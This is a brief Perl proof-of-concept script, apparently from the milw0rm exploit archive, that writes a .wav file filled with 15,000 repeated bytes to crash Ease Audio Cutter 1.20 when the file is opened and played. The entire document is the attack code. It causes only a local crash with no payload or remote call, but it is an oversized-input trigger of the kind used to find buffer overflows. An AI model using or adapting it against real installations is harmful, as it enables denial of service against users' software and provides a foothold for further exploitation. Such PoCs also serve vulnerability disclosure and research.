#!/usr/bin/perl
###########################################################################
#             Ease Audio Cutter 1.20 (.wav file) Local Crash PoC          #
#                               By : zAx                                  #
###########################################################################
#             Application Homepage : http://mp3-cutter.com                #
#   Application Download : http://mp3-cutter.com/download/audiocutter.exe #
# Description : Click Select file button, select our file and click Play  #
###########################################################################
$crash = "\x42" x 15000;
my $file = "zAx_Crash.wav";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $crash;
close($FILE);
print "Done \n";
 
# milw0rm.com [2009-09-17]
